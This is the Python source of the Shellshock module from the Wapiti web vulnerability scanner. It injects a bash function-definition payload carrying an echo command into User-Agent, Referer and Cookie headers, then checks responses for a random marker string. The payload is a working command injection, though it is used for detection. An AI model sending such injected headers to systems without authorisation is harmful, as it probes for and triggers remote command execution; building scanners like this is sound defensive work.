#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This file is part of the Wapiti project (https://wapiti-scanner.github.io)
# Copyright (C) 2014-2023 Nicolas Surribas
# Copyright (C) 2021-2024 Cyberwatch
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
import random
import string
from binascii import hexlify
from typing import Optional

from httpx import RequestError

from wapitiCore.attack.attack import Attack
from wapitiCore.net import Request, Response
from wapitiCore.definitions.exec import CommandExecutionFinding
from wapitiCore.main.log import log_red


class ModuleShellshock(Attack):
    """
    Detects scripts vulnerable to the infamous ShellShock vulnerability.
    """

    name = "shellshock"

    do_get = True
    do_post = True

    def __init__(self, crawler, persister, attack_options, stop_event, crawler_configuration):
        Attack.__init__(self, crawler, persister, attack_options, stop_event, crawler_configuration)
        empty_func = "() { :;}; "

        self.rand_string = "".join([random.choice(string.hexdigits) for _ in range(32)])
        hex_string = hexlify(self.rand_string.encode())
        bash_string = ""
        for i in range(0, 64, 2):
            bash_string += "\\x" + hex_string[i:i + 2].decode()

        cmd = f"echo; echo; echo -e '{bash_string}';"

        self.hdrs = {
            "user-agent": empty_func + cmd,
            "referer": empty_func + cmd,
            "cookie": empty_func + cmd
        }

    async def must_attack(self, request: Request, response: Optional[Response] = None):
        if response.is_directory_redirection:
            return False

        # We attempt to attach each script once whatever the method
        return request.path not in self.attacked_get

    async def attack(self, request: Request, response: Optional[Response] = None):
        url = request.path
        self.attacked_get.append(url)

        # We can't see anything by printing requests because payload is in headers so let's print nothing :)
        evil_req = Request(url)

        try:
            response = await self.crawler.async_send(evil_req, headers=self.hdrs)
        except RequestError:
            self.network_errors += 1
            return

        if response:
            data = response.content
            if self.rand_string in data:
                log_red(f"URL {url} seems vulnerable to Shellshock attack!")

                await self.add_high(
                    request_id=request.path_id,
                    finding_class=CommandExecutionFinding,
                    request=evil_req,
                    info=f"URL {url} seems vulnerable to Shellshock attack",
                    response=response
                )
